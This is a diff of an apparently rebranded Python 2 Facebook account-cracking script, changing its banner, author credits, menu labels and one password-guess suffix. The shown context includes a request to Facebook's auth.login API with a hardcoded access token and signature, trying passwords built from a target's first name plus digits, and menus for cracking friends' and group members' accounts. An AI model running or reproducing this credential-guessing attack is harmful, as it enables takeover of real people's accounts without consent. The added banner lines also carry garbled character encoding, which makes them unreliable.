@@ -47,18 +47,18 @@ def jalan(z):
 
 
 ##### LOGO #####
-logo = """\033[1;93m¦¦¦¦¦¦¦¦¦
-\033[1;93m¦_¦¦¦¦¦_¦      \033[1;91m???????????????????????
-\033[1;93m¦\033[1;92m????? \033[1;92m- _ --_--\033[1;95m+-++-+--+-+-   +-+++
-\033[1;93m¦ \033[1;92m \033[1;92m_-_-- -_ --__\033[1;93m ¦¦+-¦+-++-+---¦¦ ¦-+
-\033[1;93m¦\033[1;92m?????\033[1;92m--  - _ --\033[1;96m--+- --+-- -   +  +-+ \033[1;96  AAHIL CREATIONS
-\033[1;93m¦¦¦¦¦¦¦¦¦      \033[1;92m«----------?----------»
-\033[1;93m ¦¦ ¦¦
+logo = """\033[1;93mÂ¦Â¦Â¦Â¦Â¦Â¦Â¦Â¦Â¦
+\033[1;94mÂ¦_Â¦Â¦Â¦Â¦Â¦_Â¦      \033[1;91m???????????????????????
+\033[1;93mÂ¦\033[1;92m????? \033[1;92m- _ --_--\033[1;95m+-++-+--+-+-   +-+++
+\033[1;96mÂ¦ \033[1;92m \033[1;92m_-_-- -_ --__\033[1;93m Â¦Â¦+-Â¦+-++-+---Â¦Â¦ Â¦-+
+\033[1;93mÂ¦\033[1;92m?????\033[1;92m--  - _ --\033[1;96m--+- --+-- -   +  +-+ \033[1;96  AAHIL CREATIONS
+\033[1;93mÂ¦Â¦Â¦Â¦Â¦Â¦Â¦Â¦Â¦      \033[1;92mÂ«----------?----------Â»
+\033[1;98m Â¦Â¦ Â¦Â¦
 \033[1;93m+--------------------------------------------+
-\033[1;93m¦\033[1;96m* \033[1;93mAuthor  \033[1;93m : \033[1;93mBrother•|RANA.AAHIL\033[1;93m          ¦
-\033[1;93m¦\033[1;96m* \033[1;93mGitHub  \033[1;93m : \033[1;93m\033[4mhttps://github.com/Aahi420/tiger[0m \033[1;93m¦
-\033[1;93m¦\033[1;96m* \033[1;93mWhatsApp \033[1;93m: \033[1;93m0856-9101-5635\033[1;93m                 ¦
-\033[1;93m+--------------------------------------------+"""
+\033[1;92mÂ¦\033[1;96m* \033[1;93mAuthor  \033[1;93m : \033[1;93mBrotherâ€¢|RANA.AAHIL\033[1;93m          Â¦
+\033[1;93mÂ¦\033[1;96m* \033[1;93mGitHub  \033[1;93m : \033[1;93m\033[4mhttps://github.com/Aahi420/tiger[0m \033[1;93mÂ¦
+\033[1;93mÂ¦\033[1;96m* \033[1;93mWhatsApp \033[1;93m: \033[1;93m0856-9101-5635\033[1;93m                 Â¦
+\033[1;91m+--------------------------------------------+"""
 
 def tik():
 	titik = ['.   ','..  ','... ']
@@ -77,9 +77,9 @@ vuln = "\033[32mVuln"
 
 os.system("clear")
 print "\033[1;96m ============================================================="
-print  """\033[1;96m [¤] \x1b[1;93mASSALAMUALAIKUM\x1b[1;96m  \033[1;96m   [¤] \x1b[1;93mWHATSAPP : NI DENA\x1b[1;96m  
-\033[1;96m [¤] \x1b[1;93mSELAMAT DATAMG\x1b[1;96m      [¤] \x1b[1;93mFACEBOOK : tools termux\x1b[1;96m  
-\033[1;96m [¤] \x1b[1;93mTOOLS MR.BLACK0304\x1b[1;96m  [¤] \x1b[1;93mYOUTUBE  : mr black0304\x1b[1;96m"""
+print  """\033[1;96m [Â¤] \x1b[1;93mASSALAMUALAIKUM\x1b[1;96m  \033[1;96m   [Â¤] \x1b[1;93mWHATSAPP : NI DENA\x1b[1;96m  
+\033[1;96m [Â¤] \x1b[1;93mSELAMAT DATAMG\x1b[1;96m      [Â¤] \x1b[1;93mFACEBOOK : tools termux\x1b[1;96m  
+\033[1;96m [Â¤] \x1b[1;93mTOOLS MR.BLACK0304\x1b[1;96m  [Â¤] \x1b[1;93mYOUTUBE  : mr Aahil\x1b[1;96m"""
 print " \x1b[1;93m============================================================="
 
 CorrectUsername = "rana"
@@ -187,7 +187,7 @@ def menu():
 	print "\033[1;96m[\033[1;97m?\033[1;96m]\033[1;93m Nama \033[1;91m: \033[1;92m"+nama+"\033[1;97m               "
 	print "\033[1;96m[\033[1;97m?\033[1;96m]\033[1;93m ID   \033[1;91m: \033[1;92m"+id+"\x1b[1;97m              "
 	print 42*"\033[1;96m="
-	print "\x1b[1;96m[\x1b[1;92m1\x1b[1;96m]\x1b[1;93m Hack Fb MBF"
+	print "\x1b[1;96m[\x1b[1;92m1\x1b[1;96m]\x1b[1;93m Hack with aahil"
 	print "\x1b[1;96m[\x1b[1;92m2\x1b[1;96m]\x1b[1;93m Lihat daftar grup               "
 	print "\x1b[1;96m[\x1b[1;92m4\x1b[1;96m]\x1b[1;93m Yahoo clone               "
 	print "\x1b[1;96m[\x1b[1;91m0\x1b[1;96m]\x1b[1;91m Keluar            "
@@ -227,11 +227,11 @@ def super():
 	os.system('clear')
 	print logo
 	print 42*"\033[1;96m="
-	print "\x1b[1;96m[\x1b[1;92m1\x1b[1;96m]\x1b[1;93m Crack dari daftar teman"
-	print "\x1b[1;96m[\x1b[1;92m2\x1b[1;96m]\x1b[1;93m Crack dari teman"
-	print "\x1b[1;96m[\x1b[1;92m3\x1b[1;96m]\x1b[1;93m Crack dari member grup"
-	print "\x1b[1;96m[\x1b[1;92m4\x1b[1;96m]\x1b[1;93m Crack dari file"
-	print "\x1b[1;96m[\x1b[1;91m0\x1b[1;96m]\x1b[1;91m Kembali"
+	print "\x1b[1;96m[\x1b[1;92m1\x1b[1;96m]\x1b[1;93m apny ferinds ki maro"
+	print "\x1b[1;96m[\x1b[1;92m2\x1b[1;96m]\x1b[1;93m logo ki maro"
+	print "\x1b[1;96m[\x1b[1;92m3\x1b[1;96m]\x1b[1;93m kese grp ki maro"
+	print "\x1b[1;96m[\x1b[1;92m4\x1b[1;96m]\x1b[1;93m Crack with file"
+	print "\x1b[1;96m[\x1b[1;91m0\x1b[1;96m]\x1b[1;91m back"
 	pilih_super()
 
 def pilih_super():
@@ -392,7 +392,7 @@ def pilih_super():
 													cek.close()
 													cekpoint.append(user+pass5)
 												else:
-													pass6 = b['first_name']+'786'
+													pass6 = b['first_name']+'12'
 													data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 													q = json.load(data)
 													if 'access_token' in q:
